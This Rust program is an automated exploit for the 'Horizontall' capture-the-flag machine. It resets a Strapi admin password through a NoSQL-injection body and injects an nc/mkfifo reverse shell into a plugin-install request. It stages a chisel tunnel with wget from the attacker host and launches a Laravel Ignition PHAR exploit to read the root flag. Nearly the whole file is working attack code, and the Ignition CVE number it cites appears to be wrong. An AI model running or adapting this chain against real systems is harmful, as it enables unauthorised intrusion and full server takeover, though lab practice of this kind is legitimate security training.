use std::{
    fs,
    io,
    net,
    path,
    process,
    thread,
    time
};
use std::error::{Error};

use clap::{Parser};
use git2;
use regex::Regex;
use reqwest;
use serde::{Deserialize};

mod reverse_shell;
use reverse_shell::ReverseShell;
mod simple_http_server;
use simple_http_server::SimpleHTTPServer;

const VULNERABLE_STRAPI_VERSION: &str = "3.0.0-beta.17.4";
const HORIZONTALL_STRAPI_HOSTNAME: &str = "api-prod.horizontall.htb";
const STRAPI_PASSWORD_RESET_BODY: &str = "\
    {
        \"code\": {\"$gt\": 0},
        \"password\": \"SuperSecretPassword1\",
        \"passwordConfirmation\": \"SuperSecretPassword1\"
    }
";

pub async fn run(args: Args) -> Result<(), Box<dyn Error>> {
    println!("[*] Checking if the target's Strapi version is vulnerable...");
    confirm_vulnerable_strapi(&args.target_ip).await?;
    println!("[*] The target's strapi version appears to be vulnerable!");

    println!("[*] Attempting to reset Strapi password and receive JWT...");
    let jwt = reset_strapi_password(&args.target_ip).await?;
    println!("[*] Strapi JWT received: {}!", jwt);

    println!("[*] Initiating reverse shell in 2 seconds...");
    thread::spawn(move || {
        thread::sleep(time::Duration::from_secs(2));
        initiate_reverse_shell(args.target_ip.clone(), jwt, args.lhost.clone(), args.shell_lport).unwrap();
    });

    println!("[*] Listening for reverse shell...");
    let mut shell = ReverseShell::new(args.lhost.clone(), args.shell_lport)?;
    println!("[*] Caught reverse shell from {}!", shell.remote_endpoint);

    let user_flag = read_user_flag(&mut shell)?;
    println!("[*] User flag: {}", user_flag);

    println!("[*] Attempting to stage chisel client on target...");
    stage_chisel_client(&mut shell, args.chisel_client_path, &args.lhost, args.http_lport).await?;
    println!("[*] Successfully staged chisel client on target!");

    println!("[*] Initiating reverse port forward...");
    let mut chisel_server_process = initiate_reverse_port_forward(
        &mut shell,
        &args.chisel_server_path,
        &args.lhost,
        args.chisel_server_lport,
        args.tunnel_lport
    )?;
    println!("[*] Reverse port forward from our {} to the target's localhost:8000 initiated!", args.tunnel_lport);

    // Confirm existence of Laravel debugging page
    println!("[*] Confirming we can connect to the Laravel debugging page...");
    confirm_laravel_debug_page(args.tunnel_lport).await?;
    println!("[*] We can!");

    // Download and generate PHAR payload to read the root flag
    println!("[*] Cloning the PHPGGC & CVE-2019-3129 repositories...");
    let (phpggc_path, cve_2019_3129_path) = clone_repositories()?;
    println!("[*] Successfully cloned the repositories!");
    let phar_payload_path = generate_phar_payload(&phpggc_path, "cat /root/root.txt")?;

    // Launch PHAR payload to read the root flag
    println!("[*] Attempting to exploit CVE-2019-3129 to read the root flag...");
    let root_flag = exploit_cve_2019_3129(
        &cve_2019_3129_path,
        &format!("http://localhost:{}", args.tunnel_lport),
        &phar_payload_path
    )?;
    println!("[*] Root flag: {}", root_flag);

    // Clean up artifacts
    println!("[*] Cleaning up...");
    chisel_server_process.kill()?;
    shell.exec("rm ./chisel")?;
    fs::remove_file(&phar_payload_path)?;
    fs::remove_dir_all(&phpggc_path)?;
    fs::remove_dir_all(&cve_2019_3129_path)?;

    Ok(())
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
pub struct Args {
    /// IP address of Horizontall machine
    #[clap(short, long)]
    target_ip: net::IpAddr,

    /// Local IP address to listen on to catch reverse shell
    #[clap(long)]
    lhost: net::IpAddr,

    /// Local TCP port to listen on to catch reverse shell
    #[clap(long, default_value = "8000")]
    shell_lport: u16,

    /// Local TCP port for HTTP staging server
    #[clap(long, default_value = "8001")]
    http_lport: u16,

    /// Local TCP port for chisel server
    #[clap(long, default_value = "8002")]
    chisel_server_lport: u16,

    /// Local TCP port for reverse port forward entrypoint
    #[clap(long, default_value = "8003")]
    tunnel_lport: u16,

    /// Local path to chisel binary for local server
    #[clap(long)]
    chisel_server_path: path::PathBuf,

    /// Local path to Linux amd64 chisel binary for target
    #[clap(long)]
    chisel_client_path: path::PathBuf
}

impl Args {
    pub fn validate(&self) -> Result<(), Box<dyn Error>> {

        // Ensure both chisel file paths exist
        if !self.chisel_server_path.exists() {
            return Err(format!("Chisel server binary at {} doesn't exist", self.chisel_server_path.to_str().unwrap()).into())
        }
        if !self.chisel_client_path.exists() {
            return Err(format!("Chisel client binary at {} doesn't exist", self.chisel_client_path.to_str().unwrap()).into())
        }

        Ok(())
    }
}

async fn confirm_vulnerable_strapi(target_ip: &net::IpAddr) -> Result<(), Box<dyn Error>> {
    let client = reqwest::Client::new();
    let response = client
        .get(format!("http://{}/admin/init", target_ip))
        .header(reqwest::header::HOST, HORIZONTALL_STRAPI_HOSTNAME)
        .send()
        .await?;
    if let Err(e) = response.error_for_status_ref() {
        return Err(Box::new(e))
    }

    confirm_strapi_header(response.headers()).await?;
    let body: StrapiAdminInitBody = response.json().await?;
    confirm_strapi_version(&body).await?;

    Ok(())
}

async fn confirm_strapi_header(headers: &reqwest::header::HeaderMap) -> Result<(), Box<dyn Error>> {
    match headers.get("X-Powered-By") {
        Some(value) => {
            if value.to_str()? != "Strapi <strapi.io>" {
                return Err(format!("X-Powered-By header indicates target isn't running Strapi!").into());
            }
        }
        None => return Err(format!("No X-Powered-By header, so can't confirm the target is running Strapi!").into())
        }

    Ok(())
}

async fn confirm_strapi_version(body: &StrapiAdminInitBody) -> Result<(), Box<dyn Error>> {
    if body.data.strapiVersion != VULNERABLE_STRAPI_VERSION {
        return Err(format!(
            "Strapi version {} might not be vulnerable. We were expecting version {}.",
            body.data.strapiVersion,
            VULNERABLE_STRAPI_VERSION
        ).into())
    }

    Ok(())
}

#[derive(Deserialize, Debug)]
struct StrapiAdminInitBody {
    data: StrapiAdminInitBodyData
}

#[derive(Deserialize, Debug)]
#[allow(dead_code, non_snake_case)]
struct StrapiAdminInitBodyData {
    uuid: serde_json::Value,
    currentEnvironment: serde_json::Value,
    autoReload: serde_json::Value,
    strapiVersion: String
}

async fn reset_strapi_password(target_ip: &net::IpAddr) -> Result<String, Box<dyn Error>> {
    let client = reqwest::Client::new();
    let response = client
        .post(format!("http://{}/admin/auth/reset-password", target_ip))
        .header(reqwest::header::HOST, HORIZONTALL_STRAPI_HOSTNAME)
        .header(reqwest::header::CONTENT_TYPE, "application/json")
        .body(STRAPI_PASSWORD_RESET_BODY)
        .send()
        .await?;
    if let Err(e) = response.error_for_status_ref() {
        return Err(Box::new(e));
    }
    let body: StrapiResetPasswordBody = response.json().await?;
    Ok(body.jwt)
}

#[derive(Deserialize, Debug)]
struct StrapiResetPasswordBody {
    jwt: String,

    #[allow(dead_code)]
    user: serde_json::Value
}

fn initiate_reverse_shell(target_ip: net::IpAddr, jwt: String, lhost: net::IpAddr, lport: u16) -> Result<(), Box<dyn Error>> {
    let client = reqwest::blocking::Client::new();
    let response = client
        .post(format!("http://{}/admin/plugins/install", target_ip))
        .header(reqwest::header::HOST, HORIZONTALL_STRAPI_HOSTNAME)
        .header(reqwest::header::AUTHORIZATION, format!("Bearer {}", jwt))
        .json(&serde_json::json!({
            "plugin": format!("documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f)", lhost, lport),
            "port": "1337"
        }))
        .send()?;
    if response.status() != reqwest::StatusCode::BAD_REQUEST {
        return Err("Invalid response from Strapi when attempting to initiate the reverse shell!".into());
    }
    
    Ok(())
}

fn read_user_flag(shell: &mut reverse_shell::ReverseShell) -> Result<String, Box<dyn Error>> {
    let output = shell.exec("cat /home/developer/user.txt")?;
    return match parse_flag(&output) {
        Some(flag) => Ok(flag),
        None => Err("Unable to read the user flag".into())
    }
}

fn parse_flag(s: &str) -> Option<String> {
    let re = Regex::new("[a-f0-9]{32}").unwrap();
    return match re.captures(s) {
        Some(caps) => {
            match caps.get(0) {
                Some(flag) => Some(String::from(flag.as_str())),
                None => None
            }
        },
        None => None
    }
}

async fn stage_chisel_client(shell: &mut ReverseShell, path: path::PathBuf, lhost: &net::IpAddr, lport: u16) -> Result<(), Box<dyn Error>> {
    let mut http_server = SimpleHTTPServer::new(net::SocketAddr::new(lhost.clone(), lport));
    http_server.serve(path.parent().unwrap());

    shell.exec(&format!("/usr/bin/wget -q http://{}:{}/{} -O ./chisel", lhost, lport, path.file_name().unwrap().to_str().unwrap()))?;
    shell.exec("chmod +x ./chisel")?;
    let output = shell.exec("ls -l ./chisel")?;
    if !output.contains("rwxrwxr-x") {
        http_server.stop();
        return Err("Failed to stage chisel client on target".into());
    }

    http_server.stop();
    Ok(())
}

fn initiate_reverse_port_forward(shell: &mut ReverseShell, chisel_server_path: &path::PathBuf, lhost: &net::IpAddr, chisel_server_lport: u16, tunnel_lport: u16) -> Result<process::Child, Box<dyn Error>> {
    let p = process::Command::new(chisel_server_path)
        .args(["server", "--reverse", "--port", &chisel_server_lport.to_string()])
        .stdin(process::Stdio::null())
        .stdout(process::Stdio::null())
        .stderr(process::Stdio::null())
        .spawn()?;

    let cmd = format!("./chisel client --max-retry-count 3 {}:{} R:{}:localhost:8000", lhost, chisel_server_lport, tunnel_lport);
    shell.exec(&cmd)?;

    Ok(p)
}

async fn confirm_laravel_debug_page(lport: u16) -> Result<(), Box<dyn Error>> {
    let client = reqwest::Client::new();
    let response = client
        .get(format!("http://localhost:{}/profiles", lport))
        .send()
        .await?;
    if response.status() != reqwest::StatusCode::INTERNAL_SERVER_ERROR {
        return Err("Unable to connect to Laravel debugging page".into())
    }

    Ok(())
}

fn clone_repositories() -> Result<(path::PathBuf, path::PathBuf), git2::Error> {
    let phpggc_path = path::PathBuf::from("./phpggc");
    git2::Repository::clone("https://github.com/ambionics/phpggc.git", &phpggc_path)?;

    let cve_2019_3129_path = path::PathBuf::from("./cve_2019_3129");
    git2::Repository::clone("https://github.com/ambionics/laravel-exploits.git", &cve_2019_3129_path)?;

    Ok((phpggc_path, cve_2019_3129_path))
}

fn generate_phar_payload(phpggc_path: &path::PathBuf, cmd: &str) -> Result<path::PathBuf, io::Error> {
    let phar_payload_path = path::PathBuf::from("./payload.phar");
    process::Command::new("php")
        .arg("-d")
        .arg("phar.readonly=0")
        .arg(format!("{}/phpggc", phpggc_path.to_str().expect("Error parsing PHPGGC path when generating payload")))
        .arg("--phar")
        .arg("phar")
        .arg("-o")
        .arg(&phar_payload_path)
        .arg("--fast-destruct")
        .arg("monolog/rce1")
        .arg("system")
        .arg(&cmd)
        .stdin(process::Stdio::null())
        .stdout(process::Stdio::null())
        .stderr(process::Stdio::null())
        .status()?;
    
    Ok(phar_payload_path)
}

fn exploit_cve_2019_3129(cve_2019_3129_path: &path::PathBuf, laravel_debug_uri: &str, phar_payload_path: &path::PathBuf) -> Result<String, Box<dyn Error>> {
    let mut counter = 5u8;
    loop {
        let output = process::Command::new("python3")
            .arg(format!("{}/laravel-ignition-rce.py", cve_2019_3129_path.to_str().expect("Path to exploit repository failed UTF-8 check")))
            .arg(laravel_debug_uri)
            .arg(phar_payload_path)
            .output()?;
        let output = std::str::from_utf8(&output.stdout)?;
        match parse_flag(output) {
            Some(flag) => return Ok(flag),
            None => {
                if counter <= 0 {
                    return Err("Unable to parse the flag from the exploit output".into())
                }
                counter -= 1;
            }
        }
    }
}
